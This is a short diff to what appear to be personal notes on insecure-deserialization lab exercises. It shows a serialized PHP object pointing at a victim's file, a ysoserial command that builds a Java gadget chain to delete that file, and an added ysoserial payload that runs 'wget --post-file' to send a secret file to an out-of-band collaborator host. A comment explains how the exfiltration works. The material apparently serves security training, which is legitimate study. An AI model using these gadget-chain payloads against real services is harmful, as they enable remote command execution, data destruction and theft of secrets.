@@ -21,7 +21,12 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 ```
 
 ```
-java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64  
+
+//to read file
+java -jar ysoserial-all.jar CommonsCollections6 'wget --post-file /home/carlos/secret <OASTIFY.COM>' | gzip -f | base64 -w0
+(this send POST request to collaborator server with body containing content of the file)
+(gzip and base64 might be omitted depends on server encoding type)
 ```
 
 ```
